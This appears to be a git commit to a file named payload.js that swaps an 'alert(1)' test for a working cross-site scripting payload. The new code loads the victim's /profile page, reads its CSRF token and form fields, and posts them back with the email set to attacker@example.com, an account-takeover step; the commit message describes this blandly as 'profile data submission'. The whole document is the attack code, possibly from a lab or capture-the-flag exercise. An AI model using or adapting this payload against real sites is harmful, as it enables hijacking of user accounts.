50bb0052fd63057fe0ab531094763840939b32df
Cyb3rFred <75452166+cyb3r7hr347@users.noreply.github.com>
2026-02-18 22:17:52 +0100

    Implement fetch to handle profile data submission
    Replace alert with fetch to submit profile data.

--- payload.js
+++ payload.js
@@ -1,1 +1,22 @@
-alert(1);
+fetch('/profile')
+  .then(response => response.text())
+  .then(html => {
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    
+    const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
+
+    const params = new URLSearchParams();
+    params.append('csrf_token', csrfToken);
+    params.append('username', doc.querySelector('input[name="username"]').value);
+    params.append('firstname', doc.querySelector('input[name="firstname"]').value);
+    params.append('lastname', doc.querySelector('input[name="lastname"]').value);
+    params.append('email', 'attacker@example.com');
+    
+    
+    return fetch('/profile', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: params.toString()
+    });
+  })
